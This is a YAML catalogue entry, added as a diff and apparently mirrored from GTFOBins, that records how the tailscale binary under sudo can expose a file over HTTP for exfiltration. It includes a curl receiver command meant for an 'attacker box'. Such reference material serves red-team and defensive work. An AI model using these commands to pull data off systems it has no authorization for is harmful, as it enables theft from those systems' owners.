@@ -1,0 +1,83 @@
+id: gtfobins/tailscale/upload/sudo
+type: binary
+platform: linux
+name: tailscale
+phases:
+- exfiltration
+- privilege-escalation
+capabilities:
+- file-upload
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: tailscale serve --http=12345 /path/to/input-file
+  comment: The URL is reachable by any host of the same Tailnet.
+references:
+- https://gtfobins.github.io/gtfobins/tailscale/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        tailscale:
+          functions:
+            upload:
+            - code: tailscale serve --http=12345 /path/to/input-file
+              comment: The URL is reachable by any host of the same Tailnet.
+              contexts:
+                sudo: null
+              receiver:
+                code: curl http://<hostname>.<tailnet>.ts.net:12345/ -o /path/to/output-file
+                comment: 'An HTTP client can be used on the attacker box to receive the data.
+
+
+                  The actual URL is returned by the command.'
+    upstream_url: https://gtfobins.github.io/gtfobins/tailscale/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:4a7a727d8931a93537cb05bac71fb1b9a54ef32f8a9d993aa494f72a59615fd2
